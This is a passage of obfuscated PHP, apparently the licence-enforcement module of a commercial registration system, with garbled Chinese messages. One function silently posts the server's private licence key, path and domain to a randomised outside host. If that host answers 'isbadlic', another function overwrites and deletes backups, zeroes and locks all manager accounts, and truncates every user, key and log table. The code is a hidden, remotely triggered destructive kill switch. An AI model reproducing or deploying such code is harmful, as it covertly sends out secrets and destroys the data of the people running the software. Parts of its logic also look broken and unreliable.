        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "499", "kss_logs/index.logè¢«éæ³•ä¿®æ”¹ï¼" );
    }
    if ( 85400 < abs( strtotime( substr( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ, 0, 8 ) ) - strtotime( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ, 0, 8 ) ) ) )
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thocÿ = 1;
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qÿ, $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ );
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ = @file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Qÿ );
        if ( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUÿ != $_obfuscate_hoiLiJKHjpKJj46NkYuViI0ÿ )
        {
            _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "498", "kss_logs/index.logä¸å¯å†™ï¼" );
        }
    }
    if ( $_obfuscate_jouQkY2GipOLh5CUiI2Thocÿ == 1 )
    {
        set_error_handler( "error_report_fun_norpeat" );
        $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cÿ = urlencode( $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZMÿ );
        $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoÿ = date( "Y-m-d H:i:s" );
        $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ = $_SERVER['HTTP_HOST'];
        if ( empty( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ ) )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ = "notfind";
        }
        if ( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ != "notfind" )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ = urlencode( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ );
        }
        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokÿ( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThokÿ( "curl_exec" ) )
        {
            _obfuscate_jomIiY_JjIqRkoiTiImVkIcÿ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoÿ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cÿ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ );
        }
        set_error_handler( "error_report_fun" );
    }
}

function _obfuscate_jomIiY_JjIqRkoiTiImVkIcÿ( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYoÿ, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cÿ, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ )
{
    $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ = curl_init( );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_URL, "http://chk".mt_rand( 100000, 999999 ).".hphu.com/skey/api.php?r=".time( ) );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_RETURNTRANSFER, 1 );
    $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocÿ = "svrid=".SVRID."&hostname=".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4cÿ."&skey=".PRV_SVRLIC."&spath=".dirname( __FILE__ )."&domain=".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5Uÿ."&weblic=".urlencode( WEBLIC )."&webid=".urlencode( WEBID )."&nowtime=".date( "Y-m-d H:i:s" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_POST, 1 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_POSTFIELDS, $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocÿ );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ, CURLOPT_HTTPHEADER, array( "Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache" ) );
    $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4gÿ = curl_exec( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ );
    if ( curl_errno( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ ) )
    {
        @curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ );
    }
    else
    {
        curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4ÿ );
        if ( $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4gÿ == "isbadlic" )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "clear,curl badlist" );
            _obfuscate_koyMjY2HkImOho6JkIeQh4cÿ( );
        }
    }
}

function _obfuscate_iZSOiYeSlIqPjpSLkpSIj40ÿ( )
{
    $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpMÿ = explode( ",", substr( WEBLIC, 33 ) );
    $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYÿ = $_SERVER['HTTP_HOST'];
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ = strpos( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYÿ, ":" );
    if ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ !== FALSE )
    {
        $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYÿ = substr( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYÿ, 0, $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ );
    }
    if ( in_array( strtolower( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYÿ ), $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpMÿ ) )
    {
        if ( isset( $_SERVER['ALL_HTTP'] ) && stristr( $_SERVER['ALL_HTTP'], $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoYÿ ) === FALSE )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "497A,no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
            _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "497", "åŸŸåç»‘å®šå‡ºé”™ï¼Œè°¢è°¢ä½¿ç”¨ï¼Œè¯·æ”¯æŒæ­£ç‰ˆè½¯ä»¶ï¼" );
        }
    }
    else
    {
        _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "497B, no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "497", "åŸŸåç»‘å®šå‡ºé”™ï¼Œè°¢è°¢ä½¿ç”¨ï¼Œè¯·æ”¯æŒæ­£ç‰ˆè½¯ä»¶ï¼" );
        exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST" );
    }
}

function _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( $_obfuscate_h4yHlYmLipCJjJCGhomJjZAÿ )
{
    if ( is_file( "clsdata.log" ) )
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZAÿ."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZAÿ."\r\n\r\n", @FILE_APPEND );
    }
}

function _obfuscate_koyMjY2HkImOho6JkIeQh4cÿ( $_obfuscate_koqQlY6KkIePi4mHi4uHh5Uÿ = "" )
{
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ;
    if ( $_obfuscate_koqQlY6KkIePi4mHi4uHh5Uÿ != "" )
    {
        $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ = $_obfuscate_koqQlY6KkIePi4mHi4uHh5Uÿ;
    }
    file_put_contents( KSSLOGDIR."index.log", "200001011059550389" );
    if ( defined( "NOTDELMYSQL" ) )
    {
        _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "500B, no clear,clearuserdata" );
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "500", "è°¢è°¢ä½¿ç”¨ï¼Œè¯·æ”¯æŒæ­£ç‰ˆè½¯ä»¶ï¼" );
    }
    $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcÿ = _obfuscate_iJCRko_Hj4_Oh4eIjIaKk5Iÿ( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( empty( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcÿ ) )
    {
        foreach ( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcÿ as $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yÿ )
        {
            @file_put_contents( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yÿ, "dataerr" );
            @unlink( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yÿ );
        }
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ = new mysql_cls( );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ÿ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ );
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ÿ( "select * from kss_tb_soft " );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "update `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."` set cday=1000", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "update `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."` set cday=1000", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."_recycle`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`_recycle", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
    _obfuscate_ipORj42NiZCIio_LkZORhpEÿ( "500C, clearuserdata" );
    _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Qÿ( "500", "è°¢è°¢ä½¿ç”¨ï¼Œè¯·æ”¯æŒæ­£ç‰ˆè½¯ä»¶ï¼" );
}

$_GET['vmpbegin'] = 0;
$_GET['vmpend'] = 0;
?>
